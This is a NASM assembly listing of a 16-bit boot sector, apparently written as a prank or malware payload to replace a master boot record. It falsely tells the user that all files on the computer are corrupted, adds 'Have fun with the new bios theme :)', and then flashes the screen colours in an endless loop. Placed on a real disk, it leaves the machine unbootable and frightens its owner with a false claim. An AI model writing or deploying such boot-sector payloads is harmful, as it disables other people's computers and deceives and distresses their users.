org 0x7c00
bits 16

%macro sleep 2
	push dx
	mov ah, 86h
	mov cx, %1
	mov dx, %2
	int 15h
	pop dx
%endmacro

main:
    mov ah,0x00
    mov al,0x03
    int 0x10
    mov si,msg

print:
    push si       
    mov ah, 0x0E
    lodsb
    or al,al
    jz print_end
    int 0x10
    sleep 0x1,0x1000
    jmp print
print_end:
    pop si
    mov si,msg2

print2:
    push si       
    mov ah, 0x0E
    lodsb
    or al,al
    jz print2_end
    int 0x10
    sleep 0x1,0x1000
    jmp print2
print2_end:
    pop si
    mov si,msg3

print3:
    push si       
    mov ah, 0x0E
    lodsb
    or al,al
    jz print3_end
    int 0x10
    sleep 0x1,0x1000
    jmp print3
print3_end:
    pop si

    mov al,0
renk:
    mov ah,0x0b ;ekrani tanimlas
    mov bl,al  ;renk girdisi
    int 0x10    ;ekran komutu
    sleep 0x1,0x6
    inc al
    jmp renk
msg: DB 'All files in computer have been corrupted and from now on they all are a garbage',0
msg2: DB 'Have fun with the new bios theme',0x0d,0x0A,0
msg3 DB ':)',0

times 510-($-$$) db 0
dw 0aa55h

